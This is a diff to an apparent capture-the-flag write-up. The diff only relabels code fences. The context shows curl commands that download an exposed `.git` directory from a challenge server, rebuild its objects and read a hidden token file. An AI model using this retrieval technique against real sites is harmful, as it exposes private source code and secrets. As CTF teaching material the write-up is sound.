@@ -68,7 +68,7 @@ contained the data we want.
 The first step is to establish the commit history of the repo, which can be
 done with our good friend `.git/logs/HEAD`:
 
-```bash
+```console
 $ curl http://tumorous.9447.plumbing/.git/logs/HEAD | cat -v
 0000000000000000000000000000000000000000 cb36b491e21091a258cb26f56f6157e31084a693 root <root@ip-172-31-5-48.ap-southeast-2.compute.internal> 1412670724 +0000   commit (initial): I'm new to this repo stuff
 cb36b491e21091a258cb26f56f6157e31084a693 043a18366cb0b2ab31c0f9b14a755a8e597a8b6a John Doe <fsck@you.me> 1412670748 +0000       commit (amend): I'm new to this repo stuff
@@ -88,7 +88,7 @@ file).
 > characters are the directory under `.git/objects` and the rest of the hash is
 > the filename.
 
-```bash
+```console
 $ (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; curl http://tumorous.9447.plumbing/.git/objects/3d/bda5576912236328494b11f9361dca66c0218a) | gzip -dc | cat -v
 
 gzip: stdin: unexpected end of file
@@ -104,7 +104,7 @@ So the tree object for that commit (ignoring the erroneous `gzip` errors) is
 "97d2ea0a2433ecc3024674b1d1ab18661c99b0fe". So let's try doing the same trick to
 that object.
 
-```bash
+```console
 $ (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; curl http://tumorous.9447.plumbing/.git/objects/97/d2ea0a2433ecc3024674b1d1ab18661c99b0fe) | gzip -dc | cat -v
 
 gzip: stdin: unexpected end of file
@@ -125,7 +125,7 @@ So we're going to have to either:
 Since 1 would be a major PITA, we went with 2. So you just need to make a new
 repo, drop in the object data and then use `git` to parse the file for you.
 
-```bash
+```console
 $ cd $(mktemp -d)
 $ git init
 Initialized empty Git repository in [temporary directory]
@@ -144,7 +144,7 @@ of `token` at that point in the git repo's history --
 "0d2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0". So now all we need to do is read
 that file and we're done.
 
-```bash
+```console
 $ (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; curl http://tumorous.9447.plumbing/.git/objects/0d/2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0) | gzip -dc | cat -v
 
 gzip: stdin: unexpected end of file
